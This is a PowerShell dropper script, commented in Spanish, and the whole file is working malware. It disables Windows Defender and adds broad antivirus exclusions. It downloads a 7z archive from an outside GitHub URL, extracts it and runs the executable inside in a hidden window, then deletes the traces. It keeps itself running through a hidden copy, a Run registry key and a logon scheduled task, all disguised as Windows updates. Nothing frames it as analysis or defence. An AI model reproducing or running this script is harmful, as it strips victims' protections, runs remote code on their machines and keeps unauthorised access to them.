# ============================================
# inject.ps1 - Descarga FramehostUpdate.7z + Bypass + Persistencia
# ============================================
$ErrorActionPreference = 'SilentlyContinue'

# 1. BYPASS WINDOWS DEFENDER
try {
    Stop-Service WinDefend -Force -ErrorAction Stop
    Set-MpPreference -DisableRealtimeMonitoring $true -Force
    Set-MpPreference -DisableBehaviorMonitoring $true -Force
    Set-MpPreference -DisableBlockAtFirstSeen $true -Force
    Set-MpPreference -DisableIOAVProtection $true -Force
    Set-MpPreference -DisableScriptScanning $true -Force
    Add-MpPreference -ExclusionPath $env:APPDATA -Force
    Add-MpPreference -ExclusionPath $env:TEMP -Force
    Add-MpPreference -ExclusionExtension '.exe' -Force
    Add-MpPreference -ExclusionExtension '.7z' -Force
    Add-MpPreference -ExclusionProcess 'powershell.exe' -Force
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name DisableAntiSpyware -Value 1 -Force
    Start-Sleep -Seconds 2
} catch {}

# 2. DESCARGA Y EJECUCIÓN DEL ARCHIVO 7Z
$zipUrl = "https://raw.githubusercontent.com/DECODERkING/code/main/FramehostUpdate.7z"
$zipPath = "$env:TEMP\update.7z"
$destPath = "$env:TEMP\framehost"

try {
    (New-Object Net.WebClient).DownloadFile($zipUrl, $zipPath)
    if (Test-Path $zipPath) {
        if (-not (Test-Path $destPath)) { New-Item -ItemType Directory -Path $destPath -Force | Out-Null }
        # Usar 7zip para descomprimir
        $7zPath = "$env:TEMP\7z.exe"
        if (-not (Test-Path $7zPath)) {
            (New-Object Net.WebClient).DownloadFile("https://www.7-zip.org/a/7zr.exe", $7zPath)
        }
        Start-Process -FilePath $7zPath -ArgumentList "x `"$zipPath`" -o`"$destPath`" -y" -WindowStyle Hidden -Wait
        Start-Sleep -Seconds 3
        $exe = Get-ChildItem -Path $destPath -Filter "*.exe" | Select-Object -First 1
        if ($exe) { Start-Process $exe.FullName -WindowStyle Hidden }
        Remove-Item $zipPath -Force
        Remove-Item $destPath -Recurse -Force
    }
} catch {}

# 3. PERSISTENCIA
$hiddenDir = "$env:APPDATA\Microsoft\Windows\Explorer"
if (-not (Test-Path $hiddenDir)) { New-Item -ItemType Directory -Path $hiddenDir -Force | Out-Null }
$scriptCopy = "$hiddenDir\WinUpdate.ps1"
Copy-Item $PSCommandPath $scriptCopy -Force
Set-ItemProperty -Path $scriptCopy -Name Attributes -Value "Hidden,System"
New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "WinUpdate" -Value "powershell.exe -Ep Bypass -W Hidden -File `"$scriptCopy`"" -Force
schtasks /create /tn "WinUpdateTask" /tr "powershell.exe -Ep Bypass -W Hidden -File `"$scriptCopy`"" /sc onlogon /f | Out-Null